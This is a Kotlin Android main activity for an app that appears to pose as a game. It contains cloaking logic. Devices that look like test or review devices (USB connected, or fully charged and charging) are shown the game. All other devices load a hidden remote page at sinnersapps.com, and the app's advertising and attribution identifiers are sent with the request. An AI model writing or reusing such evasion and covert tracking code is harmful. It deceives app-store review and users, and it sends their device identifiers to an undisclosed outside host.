package com.ottplay.ottpl

import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.ottplay.ottpl.databinding.ActivityMainBinding
import com.ottplay.ottpl.util.AppsflyerUtil
import com.ottplay.ottpl.util.DataStoreManager
import com.ottplay.ottpl.util.Lottie
import com.ottplay.ottpl.util.Once
import com.ottplay.ottpl.util.getBatteryPercentage
import com.ottplay.ottpl.util.internetConnection
import com.ottplay.ottpl.util.isBatteryCharging
import com.ottplay.ottpl.util.isUSB
import com.ottplay.ottpl.util.log
import com.ottplay.ottpl.webView.WebViewFragment
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.flow.combine
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val OPEN_WEB_ID = 721
        var mainUrl = ""

        val startFragmentoId = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val webViewFragment = WebViewFragment(this)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            checkLocaleData()
            //startFragmentoId.tryEmit(R.id.libGDXFragment)

            coroutine.launch(Dispatchers.Main) {
                startFragmentoId.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.white)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
                        }
                        OPEN_WEB_ID         -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
        webViewFragment.onCreate(coroutine, binding.wwwView)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(2_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkLocaleData() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Oeb" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        mainUrl = it
                        startFragmentoId.emit(OPEN_WEB_ID)
                    }
                }
                "Ome" -> {
                    log("DataStoreManager Key = GAME")
                    startFragmentoId.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    checkIsUser()
                }
            }
        }
    }

    private fun checkIsUser() {
        if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) {
            openGame()
        } else {
            openWeb()
        }
    }

    private fun openGame() {
        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Ome" }
            startFragmentoId.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun openWeb() {
        coroutine.launch {
            AppsflyerUtil.initialize(this@MainActivity)
            AppsflyerUtil.campaignFlow.combine(AppsflyerUtil.adidFlow) { campaign, adid ->
                if (campaign != AppsflyerUtil.CAMPAIGN_INIT_VALUE && adid != AppsflyerUtil.ADID_INIT_VALUE) {

                    val afId: String = campaign ?: "null"
                    val maId: String = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id ?: "null"
                    val adId: String = adid ?: "null"
                    val apId: String = packageName

                    mainUrl = "https://sinnersapps.com/4r2LLrt5?" +
                            "$afId&" +
                            "maid=$maId&" +
                            "ad_id=$adId&" +
                            "app_id=$apId"
                    log("hello = $mainUrl")
                    startFragmentoId.tryEmit(OPEN_WEB_ID)
                }
            }.collect()
        }
    }

}